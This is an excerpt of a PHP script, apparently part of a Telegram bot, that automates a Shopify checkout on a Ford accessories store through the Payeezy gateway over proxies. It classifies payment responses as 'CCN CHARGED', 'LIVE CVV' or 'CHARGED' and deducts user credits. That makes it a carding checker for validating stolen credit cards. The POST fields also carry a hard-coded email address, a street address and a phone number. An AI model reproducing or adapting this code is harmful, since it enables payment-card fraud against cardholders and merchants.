...
$gate = 'pz';
$gateName = 'shopify + Payeezy 14 usd';
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'accessories.ford.com/cart/38007798399167:1?traffic_source=buy_now');
...
$checkouts = trim(strip_tags(getstr($r1, 'pageurl":"accessories.ford.com\/51895632063\/checkouts\/', '?')));
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/51895632063/checkouts/' . $checkouts . '');
...
$headers[] = 'method: POST';
$headers[] = 'path: /51895632063/checkouts/' . $checkouts . '';
...
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$token.'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=josewers24%40gmail.com&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=dragon&checkout%5Bshipping_address%5D%5Blast_name%5D=pers&checkout%5Bshipping_address%5D%5Baddress1%5D=211+East+Street+Road&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Feasterville-Trevose&checkout%5Bshipping_address%5D%5Bprovince%5D=PA&checkout%5Bshipping_address%5D%5Bzip%5D=19053&checkout%5Bshipping_address%5D%5Bphone%5D=%28631%29+243-5756&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=850&checkout%5Bclient_details%5D%5Bbrowser_height%5D=578&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$r2 = curl_exec($ch);
curl_close($ch);
...
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$token2.'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=ESC+Shipping+Matrix+v2-FEDEX_GROUND-9.95&checkout%5Bclient_details%5D%5Bbrowser_width%5D=850&checkout%5Bclient_details%5D%5Bbrowser_height%5D=578&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$r3 = curl_exec($ch);
curl_close($ch);
...
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$token3.'&previous_step=payment_method&step=&s='.$sid.'&checkout%5Bpayment_gateway%5D=66369650879&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=1580&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=850&checkout%5Bclient_details%5D%5Bbrowser_height%5D=578&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300');
$r5 = curl_exec($ch);
sleep(5);
curl_close($ch);
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://' . $site . '/51895632063/checkouts/' . $checkouts . '/processing?from_processing_page=1');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxie);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
$headers = array();
...
if (strpos($r6, 'Address not Verified - Approved') !== false) {
    $status = "CCN CHARGED ✅";
    $response = $msg;
    restarCreditos($chat_id);
} elseif (strpos($r6, 'Address not Verified - Insufficient Funds') !== false) {
    $status = "LIVE CVV ✅";
    $response = $msg;
    restarCreditos($chat_id);
} elseif (strpos($r6, 'Transaction Normal - Insufficient Funds') !== false) {
    $status = "LIVE CVV ✅";
    $response = $msg;
    restarCreditos($user_id);
} elseif (strpos($r6, 'Your order is confirmed') !== false || strpos($r6, 'Thanks for supporting') !== false || strpos($r6, '<div class="webform-confirmation">') !== false) {
    $status = "CHARGED ⚡";
